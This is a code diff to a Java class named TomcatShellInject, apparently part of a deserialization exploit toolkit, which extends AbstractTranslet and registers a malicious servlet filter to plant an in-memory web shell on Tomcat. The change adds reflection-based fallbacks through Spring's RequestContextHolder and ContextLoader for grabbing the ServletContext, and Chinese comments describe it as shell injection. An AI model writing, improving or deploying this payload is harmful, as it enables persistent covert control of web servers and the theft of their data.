@@ -11,6 +11,7 @@ import java.lang.reflect.Method;
 import javax.servlet.Filter;
 import javax.servlet.FilterChain;
 import javax.servlet.FilterConfig;
+import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
@@ -33,18 +34,8 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
 
     static {
         try {
-            /*shell注入，前提需要能拿到request、response等*/
-            java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class
-                .getDeclaredField("lastServicedRequest");
-            f.setAccessible(true);
-            ThreadLocal t = (ThreadLocal) f.get(null);
-            ServletRequest servletRequest = null;
-            //不为空则意味着第一次反序列化的准备工作已成功
-            if (t != null && t.get() != null) {
-                servletRequest = (ServletRequest) t.get();
-            }
-            if (servletRequest != null) {
-                javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
+            javax.servlet.ServletContext servletContext = getServletContext();
+            if (servletContext != null) {
                 org.apache.catalina.core.StandardContext standardContext = null;
                 //判断是否已有该名字的filter，有则不再添加
                 if (servletContext.getFilterRegistration(filterName) == null) {
@@ -110,6 +101,47 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    private static ServletContext getServletContext()
+        throws NoSuchFieldException, IllegalAccessException {
+        ServletRequest servletRequest = null;
+        /*shell注入，前提需要能拿到request、response等*/
+        java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class
+            .getDeclaredField("lastServicedRequest");
+        f.setAccessible(true);
+        ThreadLocal threadLocal = (ThreadLocal) f.get(null);
+        //不为空则意味着第一次反序列化的准备工作已成功
+        if (threadLocal != null && threadLocal.get() != null) {
+            servletRequest = (ServletRequest) threadLocal.get();
+        }
+        //如果不能去到request，则换一种方式尝试获取
+
+        //spring获取法1
+        if (servletRequest == null) {
+            try {
+                Class c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
+                Method m = c.getMethod("getRequestAttributes");
+                Object o = m.invoke(null);
+                c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
+                m = c.getMethod("getRequest");
+                servletRequest = (ServletRequest) m.invoke(o);
+            } catch (Throwable t) {}
+        }
+        if (servletRequest != null)
+            return servletRequest.getServletContext();
+
+        //spring获取法2
+        try {
+            Class c = Class.forName("org.springframework.web.context.ContextLoader");
+            Method m = c.getMethod("getCurrentWebApplicationContext");
+            Object o = m.invoke(null);
+            c = Class.forName("org.springframework.web.context.WebApplicationContext");
+            m = c.getMethod("getServletContext");
+            ServletContext servletContext = (ServletContext) m.invoke(o);
+            return servletContext;
+        } catch (Throwable t) {}
+        return null;
     }
 
     @Override
